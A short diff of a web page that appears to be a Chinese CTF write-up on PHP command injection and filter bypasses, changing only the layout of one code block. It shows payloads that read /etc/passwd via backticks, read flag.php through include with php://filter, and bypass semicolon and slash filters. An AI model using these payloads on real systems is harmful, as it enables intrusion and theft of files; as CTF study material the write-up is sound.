@@ -106,7 +106,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `cat /etc/passwd`;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>可以通过构造文件包含的形式读取文件，payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">//分号如果被过滤则可以用?&gt;代替</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/resource=flag.php //分号如果被过滤则可以用?&gt;代替</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 <h2 id="过滤斜杠"><a href="#过滤斜杠" class="headerlink" title="过滤斜杠/"></a>过滤斜杠/</h2><p>可以通过<code>;</code>拼接命令绕过</p>
